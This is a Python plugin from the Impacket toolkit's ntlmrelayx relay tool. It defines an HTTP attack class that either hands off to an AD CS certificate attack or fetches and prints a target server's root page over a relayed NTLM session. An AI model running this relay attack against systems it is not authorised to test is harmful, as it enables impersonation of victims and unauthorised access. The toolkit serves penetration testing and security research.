# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   HTTP Attack Class
#   HTTP protocol relay attack
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#   Ex Android Dev (@ExAndroidDev)

from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack

PROTOCOL_ATTACK_CLASS = "HTTPAttack"


class HTTPAttack(ProtocolAttack, ADCSAttack):
    """
    This is the default HTTP attack. This attack only dumps the root page, though
    you can add any complex attack below. self.client is an instance of urrlib.session
    For easy advanced attacks, use the SOCKS option and use curl or a browser to simply
    proxy through ntlmrelayx
    """
    PLUGIN_NAMES = ["HTTP", "HTTPS"]

    def run(self):

        if self.config.isADCSAttack:
            ADCSAttack._run(self)
        else:
            # Default action: Dump requested page to file, named username-targetname.html
            # You can also request any page on the server via self.client.session,
            # for example with:
            self.client.request("GET", "/")
            r1 = self.client.getresponse()
            print(r1.status, r1.reason)
            data1 = r1.read()
            print(data1)
